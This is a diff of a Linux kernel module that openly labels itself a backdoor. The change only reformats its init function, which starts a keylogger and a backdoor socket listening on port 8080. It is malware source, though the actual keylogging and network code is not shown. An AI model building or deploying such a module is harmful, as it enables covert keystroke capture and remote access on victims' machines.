@@ -5,7 +5,6 @@
 #include "backdoor_socket.h"
 #include "keylogger.h"
 
-
 // port the backdoor will be listening for connections on.
 #define PORT 8080
 
@@ -15,23 +14,23 @@
  */
 static int __init backdoor_init(void)
 {
-  int err;
+	int err;
 
 	printk(KERN_DEBUG "backdoor: initializing backdoor module\n");
 	err = keylogger_module_init();
-  if(err){
-    printk(KERN_ERR "backdoor: error initializing keylogger\n");
-    return err;
-  }
+	if (err) {
+		printk(KERN_ERR "backdoor: error initializing keylogger\n");
+		return err;
+	}
 
-  err = backdoor_socket_init(PORT);
-  if(err){
-    printk(KERN_ERR "backdoor: error initializing socket\n");
-    keylogger_module_exit();
-    return err;
-  }
+	err = backdoor_socket_init(PORT);
+	if (err) {
+		printk(KERN_ERR "backdoor: error initializing socket\n");
+		keylogger_module_exit();
+		return err;
+	}
 
-  printk(KERN_DEBUG "backdoor: initialization complete\n");
+	printk(KERN_DEBUG "backdoor: initialization complete\n");
 	return 0;
 }
 
